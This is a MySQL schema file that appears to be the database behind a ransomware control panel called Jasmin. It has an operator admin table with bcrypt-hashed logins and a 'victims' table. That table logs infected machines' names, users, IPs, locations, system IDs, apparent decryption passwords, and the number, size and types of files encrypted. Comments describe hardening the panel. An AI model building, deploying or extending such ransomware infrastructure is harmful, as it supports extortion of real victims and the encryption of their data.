-- Jasmin DB Schema (Secured)
-- Passwords stored as bcrypt hashes via PHP password_hash()

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";

/*!40101 SET NAMES utf8mb4 */;

-- Admin table
CREATE TABLE IF NOT EXISTS `master` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `admin` varchar(255) NOT NULL,
  `creds` varchar(255) NOT NULL COMMENT 'bcrypt hash from password_hash()',
  PRIMARY KEY (`id`),
  UNIQUE KEY `admin` (`admin`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- Default admin will be created via install wizard or setup.php
-- Do not insert here as bcrypt hashes must be generated at runtime

-- Victims table
CREATE TABLE IF NOT EXISTS `victims` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `machine_name` varchar(255) NOT NULL,
  `computer_user` varchar(255) NOT NULL,
  `os` varchar(100) NOT NULL,
  `date` varchar(100) NOT NULL,
  `time` time NOT NULL,
  `ip` varchar(45) NOT NULL,
  `location` varchar(255) NOT NULL,
  `systemid` varchar(255) NOT NULL,
  `password` varchar(255) NOT NULL,
  `encrypted_count` int(11) NOT NULL DEFAULT 0,
  `encrypted_size` bigint(20) NOT NULL DEFAULT 0,
  `encrypted_types` text DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  INDEX `idx_systemid` (`systemid`),
  INDEX `idx_ip` (`ip`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
